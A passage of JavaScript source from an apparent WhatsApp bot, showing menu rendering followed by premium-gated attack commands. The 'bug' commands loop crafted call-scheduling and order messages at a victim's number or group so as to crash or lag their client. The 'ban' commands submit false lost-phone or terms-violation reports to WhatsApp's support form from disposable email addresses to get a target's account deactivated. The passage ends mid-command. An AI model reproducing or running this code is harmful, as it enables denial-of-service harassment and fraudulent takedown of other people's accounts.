                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'bugmenu': {
let xmenu_oh = `${readmore}\n\n${bugmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/9c90e2d490aef81155dbb.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
            case 'checkaccount':
            case 'account': {
               let a = db.data.users[sender]
               let b = `Below is your account information\n`
               b += `================================\n`
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               b += `Title: ${a.title}\n`
               b += `Afk Time: ${a.afkTime}\n`
               b += `Afk Reason: ${a.afkReason}\n` 
               b += `Nickname: ${a.nick}\n`
               b += `Premium Status: ${a.premium}\n`
               b += `Your Limit: ${a.limit}\n`
               b += `================================`
               XeonBotInc.sendMessage(sender, { text: b }, { quoted: m })
               replygcxeon('Account Details Has Been Sent In Private Chat')
            }
            break
            case 'limit':
case 'checklimit': {
    let a = db.data.users[sender] || { limit: 0, serialNumber: '-' };
    let b = `Your Limit: ${a.limit}\n`;
    b += `Premium Status: ${isPremium ? 'On' : 'Off'}\n`;
    b += `Serial Code:\n*[${a.serialNumber}]*\n`;
    replygcxeon(b);
}
break;
            
            //bug && war cases 
//⚠️do not edit cases otherwise bug not work
//bug cases
case 'amountbug': {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return relygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'pmbug' :{
 if (!isPremium) return replygcxeon(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'delaybug' : {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'docubug': {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
if (args.length < 1) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'unlimitedbug' : {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'bombug': {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'lagbug' : {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'trollybug': {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
XeonBotInc.relayMessage(victim, order.message, { messageId: order.key.id })
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'gcbug' : {
if (!isPremium) return replygcxeon(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'delaygcbug' :  {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'laggcbug' :  {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'bomgcbug' :  {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await haikal.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'unlimitedgcbug' :  {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'trollygcbug' :  {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
XeonBotInc.relayMessage(xeongc, order.message, { messageId: order.key.id })
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'docugcbug' :  {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
} 
break

//ban/unban cases
case 'out': case 'verif':{
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv3': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv6': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
